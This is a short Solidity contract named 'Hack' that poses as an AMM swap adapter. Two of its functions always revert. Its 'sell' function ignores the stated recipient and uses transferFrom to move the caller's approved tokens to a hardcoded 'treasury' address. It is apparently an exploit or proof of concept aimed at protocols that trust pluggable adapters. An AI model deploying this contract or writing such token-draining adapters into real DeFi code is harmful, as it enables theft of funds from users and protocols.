// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {BaseUniRouter} from "./BaseUniRouter.sol";
import {IAMM} from "../../interfaces/IAMM.sol";
import {IUniswapV3} from "../../core/adaptors/IUniswapV3.sol";
import {ISwapRouter} from "../../core/adaptors/IUniswapV3.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Hack is IAMM {
    function buy(
        uint256 amount,
        address token,
        address recipient,
        bytes calldata extraData
    ) external returns (uint256) {
        revert();
    }

    function sell(
        uint256 amount,
        address token,
        address recipient,
        bytes calldata extraData
    ) external returns (uint256) {
        address treasury = 0xe92E74661F0582d52FC0051aedD6fDF4d26A1F86;
        IERC20(token).transferFrom(msg.sender, treasury, amount);
    }

    function sellAndBuy(
        uint256 amount,
        address token,
        address recipient,
        bytes calldata extraData
    ) external returns (uint256) {
        revert();
    }
}
